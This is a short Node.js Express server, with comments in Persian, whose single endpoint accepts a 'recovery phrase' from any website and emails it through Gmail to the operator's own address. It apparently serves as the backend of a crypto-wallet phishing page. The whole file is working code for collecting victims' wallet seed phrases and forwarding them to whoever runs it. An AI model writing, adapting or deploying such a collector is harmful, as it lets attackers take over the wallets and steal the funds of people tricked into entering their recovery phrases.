require('dotenv').config();  // این خط برای استفاده از .env است
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();

// Enable CORS for cross-origin requests
app.use(cors());

// Use body-parser to parse incoming requests
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// تنظیم Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,  // ایمیل شما از متغیر محیطی
        pass: process.env.EMAIL_PASS   // رمز عبور از متغیر محیطی
    }
});

// مسیری برای ارسال اطلاعات
app.post('/send-recovery', (req, res) => {
    const { recoveryPhrase } = req.body;

    // بررسی وجود recoveryPhrase در درخواست
    if (!recoveryPhrase) {
        return res.status(400).send('Recovery phrase is required!');
    }

    // ایمیل ارسال اطلاعات
    const mailOptions = {
        from: process.env.EMAIL_USER,  // ایمیل ارسال‌کننده
        to: process.env.EMAIL_USER,    // ایمیل دریافت‌کننده
        subject: 'Recovery Phrase Received',
        text: `A new recovery phrase was submitted: \n\n${recoveryPhrase}`
    };

    // ارسال ایمیل
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            return res.status(500).send('Failed to send recovery phrase.');
        } else {
            console.log('Email sent: ' + info.response);
            return res.status(200).send('Recovery phrase sent successfully!');
        }
    });
});

// راه‌اندازی سرور
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
